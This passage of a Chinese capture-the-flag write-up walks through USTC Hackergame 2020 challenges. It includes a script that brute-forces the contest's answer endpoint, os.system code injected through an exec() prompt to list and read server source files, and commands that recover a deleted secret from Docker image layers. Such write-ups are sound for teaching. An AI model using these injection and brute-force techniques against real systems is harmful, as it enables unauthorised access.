post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a 